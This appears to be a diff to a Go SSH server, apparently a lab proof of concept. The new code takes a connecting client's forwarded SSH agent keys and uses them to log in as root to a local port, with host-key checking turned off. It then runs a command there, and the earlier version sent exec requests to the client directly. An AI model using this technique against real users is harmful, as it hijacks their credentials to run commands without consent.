@@ -1,9 +1,7 @@
 package main
 
 import (
-	"errors"
 	"fmt"
-	"io"
 	"log"
 	"net"
 	"os"
@@ -108,24 +106,44 @@ func handleConnection(nConn net.Conn, config *ssh.ServerConfig) {
 
 		// Push an exec request to the client
 		go func() {
-			cmd := "cat /version.txt"
-			//cmd := "touch /tmp/wes"
-			ok, err := channel.SendRequest("exec", true, ssh.Marshal(&struct{ Command string }{cmd}))
+			// Establish an SSH connection back to the client
+			clientConfig := &ssh.ClientConfig{
+				User: "root",
+				Auth: []ssh.AuthMethod{
+					ssh.PublicKeysCallback(agent.NewClient(nConn).Signers),
+				},
+				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+			}
+
+			client, err := ssh.Dial("tcp", "127.0.0.1:3002", clientConfig)
 			if err != nil {
-				log.Printf("Failed to send exec request: %v", err)
+				log.Printf("Failed to dial client: %v", err)
 				return
 			}
-			if !ok {
-				log.Printf("Exec request was rejected by the client")
+			defer client.Close()
+
+			// Create a new session
+			session, err := client.NewSession()
+			if err != nil {
+				log.Printf("Failed to create session: %v", err)
+				return
+			}
+			defer session.Close()
+
+			// Capture the output of the command
+			output, err := session.CombinedOutput("/usr/bin/cat /version.txt")
+			if err != nil {
+				log.Printf("Failed to run command: %v", err)
 				return
 			}
 
-			// Read the output from the command
-			output, err := io.ReadAll(channel)
-			if err != nil && errors.Is(err, io.EOF) {
-				log.Printf("Failed to read output: %v", err)
+			// Write the output to the channel
+			_, err = channel.Write(output)
+			if err != nil {
+				log.Printf("Failed to write output to channel: %v", err)
 				return
 			}
+
 			fmt.Printf("Command output: %s\n", string(output))
 
 			// Schedule the channel to close after 5 seconds
